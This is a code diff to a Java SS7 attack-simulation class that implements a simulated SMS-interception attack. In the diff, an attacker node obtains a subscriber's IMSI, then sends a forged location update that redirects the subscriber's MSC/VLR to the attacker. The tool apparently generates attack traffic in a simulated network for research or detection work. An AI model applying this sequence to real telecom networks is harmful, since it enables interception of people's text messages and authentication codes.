@@ -1,10 +1,16 @@
 package org.mobicents.protocols.ss7.tools.simulator;
 
+import org.mobicents.protocols.ss7.map.MAPParameterFactoryImpl;
+import org.mobicents.protocols.ss7.map.api.MAPParameterFactory;
+import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
 import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
+import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
+import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
 import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
 import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
 import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
 import org.mobicents.protocols.ss7.map.primitives.IMSIImpl;
+import org.mobicents.protocols.ss7.tools.simulator.common.AttackConfigurationData;
 import org.mobicents.protocols.ss7.tools.simulator.management.AttackTesterHost;
 import org.mobicents.protocols.ss7.tools.simulator.management.Subscriber;
 import org.mobicents.protocols.ss7.tools.simulator.management.SubscriberManager;
@@ -21,6 +27,7 @@ public class AttackSimulationOrganizer implements Stoppable {
     private SimpleAttackGoal simpleAttackGoal;
 
     private int chanceOfAttack;
+    private int numberOfSubscribers;
 
     private SubscriberManager subscriberManager;
 
@@ -69,8 +76,25 @@ public class AttackSimulationOrganizer implements Stoppable {
     public AttackSimulationOrganizer(String simulatorHome, boolean simpleSimulation, String simpleAttackGoal, int numberOfSubscribers, int chanceOfAttack) {
         this.random = new Random(System.currentTimeMillis());
         this.simpleSimulation = simpleSimulation;
+        this.numberOfSubscribers = numberOfSubscribers;
         this.chanceOfAttack = chanceOfAttack;
-        this.subscriberManager = new SubscriberManager();
+
+        MAPParameterFactory mapParameterFactory = new MAPParameterFactoryImpl();
+
+        ISDNAddressString defaultMscAddress = mapParameterFactory.createISDNAddressString(
+                AddressNature.international_number,
+                NumberingPlan.ISDN,
+                AttackConfigurationData.MSC_A_NUMBER);
+        ISDNAddressString defaultHlrAddress = mapParameterFactory.createISDNAddressString(
+                AddressNature.international_number,
+                NumberingPlan.ISDN,
+                AttackConfigurationData.HLR_A_NUMBER);
+        ISDNAddressString defaultVlrAddress = mapParameterFactory.createISDNAddressString(
+                AddressNature.international_number,
+                NumberingPlan.ISDN,
+                AttackConfigurationData.VLR_A_NUMBER);
+
+        this.subscriberManager = new SubscriberManager(defaultMscAddress, defaultVlrAddress, defaultHlrAddress);
         this.subscriberManager.createRandomSubscribers(numberOfSubscribers);
 
         if (this.simpleSimulation) {
@@ -466,6 +490,7 @@ public class AttackSimulationOrganizer implements Stoppable {
     }
 
     public void start() {
+
         startAttackSimulationHosts();
 
         if (!waitForM3UALinks())
@@ -729,6 +754,7 @@ public class AttackSimulationOrganizer implements Stoppable {
     }
 
     private void attackInterceptSms() {
+        MAPParameterFactory mapParameterFactory = this.attackerBhlrA.getMapMan().getMAPStack().getMAPProvider().getMAPParameterFactory();
         Subscriber subscriber = this.getSubscriberManager().getRandomSubscriber();
 
         this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());
@@ -745,14 +771,50 @@ public class AttackSimulationOrganizer implements Stoppable {
         this.smscAhlrA.getTestAttackClient().clearLastSRIForSMResponse();
         this.smscAmscA.getTestAttackServer().performMtForwardSM("SMS Message", sriResponse.getIMSI().getData(), sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress(), this.getSubscriberManager().getRandomSubscriber().getMsisdn().getAddress());
 
+        this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());
 
+        while(!this.smscAhlrA.gotSRIForSMResponse()) {
+            try {
+                Thread.sleep(50);
+            } catch(InterruptedException e) {
+                System.exit(50);
+            }
+        }
 
-        //Update subscriber info.
-        this.vlrAhlrA.getTestAttackClient().performUpdateLocationRequest(subscriber.getImsi(), null, null);
+        sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
+        this.attackerBhlrA.getTestAttackClient().clearLastSRIForSMResponse();
 
-        //Introduce a delay before sending an sms.
-        this.smscAmscA.getTestAttackServer().performSRIForSM("");
-        this.smscAmscA.getTestAttackServer().performMtForwardSM("", "", "", "");
+        ISDNAddressString newMscAddress = mapParameterFactory.createISDNAddressString(
+                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getAddressNature(),
+                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getNumberingPlan(),
+                this.attackerBhlrA.getConfigurationData().getSccpConfigurationData().getCallingPartyAddressDigits());
+        ISDNAddressString newVlrAddress = mapParameterFactory.createISDNAddressString(
+                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getAddressNature(),
+                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getNumberingPlan(),
+                this.attackerBhlrA.getConfigurationData().getSccpConfigurationData().getCallingPartyAddressDigits());
+
+        this.attackerBhlrA.getTestAttackClient().performUpdateLocationRequest(sriResponse.getIMSI(), newMscAddress, newVlrAddress);
+
+        try {
+            Thread.sleep(1000);
+        } catch(InterruptedException e) {
+            System.exit(50);
+        }
+
+        this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());
+
+        while(!this.smscAhlrA.gotSRIForSMResponse()) {
+            try {
+                Thread.sleep(50);
+            } catch(InterruptedException e) {
+                System.exit(50);
+            }
+        }
+
+        sriResponse = this.smscAhlrA.getTestAttackClient().getLastSRIForSMResponse();
+        this.smscAhlrA.getTestAttackClient().clearLastSRIForSMResponse();
+        System.out.println("Got SRI after successful attack: VLR: " + sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber() + ". MSC: " + sriResponse.getLocationInfoWithLMSI().getAdditionalNumber().getMSCNumber().getAddress());
+        this.smscAmscA.getTestAttackServer().performMtForwardSM("SMS Message", sriResponse.getIMSI().getData(), sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress(), this.getSubscriberManager().getRandomSubscriber().getMsisdn().getAddress());
     }
 
     private void performMoSMS() {
